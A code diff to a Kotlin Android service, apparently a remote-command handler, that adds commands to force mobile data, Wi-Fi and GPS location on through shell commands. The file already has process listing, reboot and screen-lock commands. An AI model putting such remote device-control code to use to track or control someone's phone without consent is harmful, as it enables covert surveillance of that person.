@@ -257,6 +257,9 @@ class ConnectorService : Service() {
             cmd == "get_processes"       -> Pair(runShell("ps -A"), "command_result")
 
             // ── Device control ──
+            cmd == "data_on"             -> Pair(enableMobileData(), "command_result")
+            cmd == "wifi_on"             -> Pair(enableWifi(), "command_result")
+            cmd == "location_on"         -> Pair(enableLocation(), "command_result")
             cmd == "reboot_device"       -> Pair(rebootDevice(), "command_result")
             cmd == "wake_screen"         -> Pair(wakeScreen(), "command_result")
             cmd == "lock_screen"         -> Pair(lockScreen(), "command_result")
@@ -585,6 +588,33 @@ class ConnectorService : Service() {
     // ─────────────────────────────────────────
     //  DEVICE CONTROL
     // ─────────────────────────────────────────
+
+    private fun enableMobileData(): String {
+        return try {
+            runShell("svc data enable")
+            "Mobile data diaktifkan"
+        } catch (e: Exception) { "Error: ${e.message}" }
+    }
+
+    private fun enableWifi(): String {
+        return try {
+            if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.Q) {
+                @Suppress("DEPRECATION")
+                (applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager).isWifiEnabled = true
+            } else {
+                runShell("svc wifi enable")
+            }
+            "WiFi diaktifkan"
+        } catch (e: Exception) { "Error: ${e.message}" }
+    }
+
+    private fun enableLocation(): String {
+        return try {
+            runShell("settings put secure location_mode 3")
+            runShell("settings put secure location_providers_allowed +gps,+network,+passive")
+            "Lokasi (GPS) diaktifkan"
+        } catch (e: Exception) { "Error: ${e.message}" }
+    }
 
     private fun lockScreen(): String {
         return try {
